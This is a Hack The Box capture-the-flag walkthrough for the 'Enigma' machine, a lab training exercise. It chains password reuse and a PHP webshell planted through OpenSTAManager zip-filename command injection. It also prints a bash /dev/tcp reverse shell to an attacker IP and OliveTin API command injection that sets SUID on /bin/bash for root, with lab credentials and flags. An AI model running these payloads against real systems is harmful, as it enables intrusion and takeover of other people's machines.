---
description: 'Difficulty: Medium  | OS: Linux'
---

# Enigma

## HTB Enigma — Full Writeup

**Difficulty:** Medium\
**OS:** Linux\
**IP:** 10.129.30.23

***

### Attack Chain

```
NFS Enumeration → Employee PDF (kevin:Enigma2024!) → IMAP Enumeration
→ Sarah's Inbox (OpenSTAManager creds) → Zip Filename Injection (Webshell)
→ RCE as www-data → DB Dump → Hash Cracking → Lateral Movement (haris)
→ OliveTin API Command Injection → Root Shell
```

***

### 1. Reconnaissance

#### Full TCP Port Scan

```bash
# Attack machine
nmap -Pn -p- --min-rate 5000 -oA full_tcp 10.129.30.23
```

**Open ports:**

```
22/tcp   - SSH
80/tcp   - HTTP
110/tcp  - POP3
111/tcp  - RPCBind
143/tcp  - IMAP
993/tcp  - IMAPS
995/tcp  - POP3S
2049/tcp - NFS
```

#### Add hosts entry

```bash
# Attack machine
echo "10.129.30.23 enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts
```

***

### 2. NFS Share Enumeration

```bash
# Attack machine
sudo nmap --script=nfs-showmount,nfs-ls,nfs-statfs -p111,2049 10.129.30.23
```

**Output:**

```
| nfs-showmount:
|_  /srv/nfs/onboarding *
| nfs-ls: Volume /srv/nfs/onboarding
| PERMISSION  UID  GID  SIZE  FILENAME
| rw-r--r--   0    0    1751  New_Employee_Access.pdf
```

#### Mount and read the exposed file

```bash
# Attack machine
sudo mkdir -p /mnt/onboarding
sudo mount -t nfs -o vers=3,nolock 10.129.30.23:/srv/nfs/onboarding /mnt/onboarding
ls -la /mnt/onboarding
xdg-open /mnt/onboarding/New_Employee_Access.pdf
sudo umount -l /mnt/onboarding
```

**Found in PDF:**

```
New Employee: Kevin
Credentials: kevin:Enigma2024!
```

***

### 3. IMAP Enumeration — Read Mailboxes

#### List Kevin's mailboxes

```bash
# Attack machine
curl -s --url "imaps://10.129.30.23/" --user 'kevin:Enigma2024!' -k
```

**Output:**

```
* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
* LIST (\NoInferiors \UnMarked \Trash) "/" Trash
* LIST (\HasNoChildren) "/" INBOX
```

#### Read Kevin's inbox

```bash
# Attack machine
curl -s --url "imaps://10.129.30.23/INBOX/;MAILINDEX=1" --user 'kevin:Enigma2024!' -k
```

**Email from sarah@enigma.htb — Welcome email revealing:**

* Sarah is in the Accounts department
* Access credentials are on the company shared drive (NFS — already found)

#### Try Sarah's account with same password (password reuse)

```bash
# Attack machine
curl -s --url "imaps://10.129.30.23/INBOX/;MAILINDEX=1" --user 'sarah:Enigma2024!' -k
```

**Email in Sarah's inbox from it@enigma.htb:**

```
Subject: Re: OpenSTAManager Access Request
From: it@enigma.htb
To: sarah@enigma.htb

Hi Sarah,
I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

***

### 4. OpenSTAManager — Zip Filename Injection → Webshell Upload

Logged into `http://support_001.enigma.htb` as `admin:Ne3s4rtars78s`.

Discovered a file upload feature that processes zip archives. Exploited a **filename command injection** vulnerability — the zip filename is passed unsanitized to a shell command, allowing injection via quote escape.

#### Create malicious zip

```bash
# Attack machine
python3 << 'EOF'
import zipfile, os

cmd = "echo '<?php system($_GET[\"c\"]); ?>' > files/SHELL.php"
malicious_filename = f'test.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")

print(f"[+] Created exploit.zip with malicious filename")
print(f"[+] Filename: {malicious_filename}")
EOF
```

Upload `exploit.zip` via the OpenSTAManager interface.

#### Verify webshell is working

```bash
# Attack machine
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Trigger reverse shell

```bash
# Attack machine — start listener
nc -lvnp 4444
```

```bash
# Attack machine — trigger reverse shell
curl "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.133/4444+0>%261'"
```

**Shell received:**

```
listening on [any] 4444 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.30.23] 38434
bash: cannot set terminal process group: Inappropriate ioctl for device
www-data@enigma:~/html/openstamanager/files$
```

***

### 5. Extract Database Credentials & Dump Hashes

Found database credentials in OpenSTAManager config files:

```bash
# Target — as www-data
mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "SELECT * FROM zz_users;"
```

**Output:**

```
id  username  password                                                          email
1   admin     $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu   admin@enigma.htb
2   haris     $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC   haris@enigma.htb
```

***

### 6. Offline Password Cracking

```bash
# Attack machine
cat hashes.txt
# $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
# $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Cracked:**

```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

Credentials: `haris:bestfriends`

***

### 7. Lateral Movement — User Shell

```bash
# Target — as www-data
su - haris
# Password: bestfriends

whoami
# haris
```

**User flag:**

```bash
cat /home/haris/user.txt
# b922673a81fbae8e94dda2b657974ba5
```

***

### 8. Internal Service Enumeration

```bash
# Target — as haris
ss -tlnp
```

Identified a locally listening service on port **1337**:

```
LISTEN  0  4096  127.0.0.1:1337  0.0.0.0:*
```

```bash
# Target — as haris
curl -s http://127.0.0.1:1337/
```

Identified as **OliveTin** — a web UI for running predefined shell commands.

***

### 9. Analyze OliveTin Config — Guest Execution Misconfiguration

```bash
# Target — as haris
cat /etc/OliveTin/config.yaml
```

**Key misconfigurations:**

```yaml
# No login required for guests
authRequireGuestsToLogin: false

# Guests can execute actions
defaultPermissions:
  view: true
  exec: true
  logs: true

# Vulnerable action — db_pass type:password bypasses shell safety checks
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
      default: backup_svc
    - name: db_pass
      type: password        # <-- not sanitized, shell metacharacters allowed!
    - name: db_name
      type: ascii_identifier
      default: production
```

**OliveTin runs as root:**

```bash
# Target — as haris
ps aux | grep -i olive
# root  1516  ...  /usr/local/bin/OliveTin
```

***

### 10. Exploit — API Parameter Command Injection → Root

#### Step 1: Get the bindingId

```bash
# Target — as haris
curl -s -X POST http://127.0.0.1:1337/api/GetDashboard \
  -H "Content-Type: application/json" \
  -d '{}' | python3 -m json.tool 2>/dev/null | grep -i "binding\|backup"
```

**Relevant output:**

```
"title": "Backup Database",
"bindingId": "backup_database",
```

#### Step 2: Inject via db\_pass to set SUID on /bin/bash

The shell command OliveTin executes becomes:

```bash
mysqldump -u backup_svc -p'x'||chmod u+s /bin/bash||echo '' production > /opt/backups/backup.sql
```

The single-quote in `db_pass` breaks out of the quoted argument and injects `chmod u+s /bin/bash` as a separate shell command, executed as root.

```bash
# Target — as haris
curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'\''||chmod u+s /bin/bash||echo '\''"},
    {"name":"db_name","value":"production"}
  ]}'
```

**Response:**

```json
{"executionTrackingId":"f087de1f-eff4-4449-8713-ddaec7e61f2f"}
```

#### Step 3: Verify SUID and get root shell

```bash
# Target — as haris
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31 2024 /bin/bash

/bin/bash -p
whoami
# root

cat /root/root.txt
# 21d55add59e07abc9ccd90ec687d712e
```

***

### Credentials Summary

| Service        | Username | Password      | Source          |
| -------------- | -------- | ------------- | --------------- |
| IMAP/System    | kevin    | Enigma2024!   | NFS PDF         |
| IMAP/System    | sarah    | Enigma2024!   | Password reuse  |
| OpenSTAManager | admin    | Ne3s4rtars78s | Sarah's email   |
| MySQL          | brollin  | Fri3nds@9099  | App config file |
| System         | haris    | bestfriends   | Hash cracked    |

***

### Flags

| Flag     | Value                            |
| -------- | -------------------------------- |
| user.txt | b922673a81fbae8e94dda2b657974ba5 |
| root.txt | 21d55add59e07abc9ccd90ec687d712e |

***

### Key Vulnerabilities & Lessons Learned

| Step      | Vulnerability                                                        | Impact                    |
| --------- | -------------------------------------------------------------------- | ------------------------- |
| Recon     | NFS share exposed to `*` (everyone)                                  | Sensitive PDF leaked      |
| Reuse     | Password reuse across accounts                                       | Access to Sarah's mailbox |
| Foothold  | OpenSTAManager zip filename command injection                        | Webshell as www-data      |
| DB        | Hardcoded credentials in app config                                  | Full DB dump + hashes     |
| Privesc 1 | Weak bcrypt password cracked with rockyou                            | Shell as haris            |
| Privesc 2 | OliveTin guest exec + `password`-type arg injection (CVE-2026-27626) | Root shell                |

**Takeaways:**

* NFS shares exposed to `*` are a common source of credential leaks
* Always try password reuse across discovered accounts
* Zip filename injection is a subtle but powerful attack vector in file processing apps
* Internal localhost services are not automatically safe after lateral movement
* OliveTin's `password` argument type bypasses shell safety checks entirely
* Running OliveTin as root with guest execution enabled is a critical misconfiguration
* Use `bindingId` (not `actionId`) when calling the OliveTin `/api/StartAction` endpoint
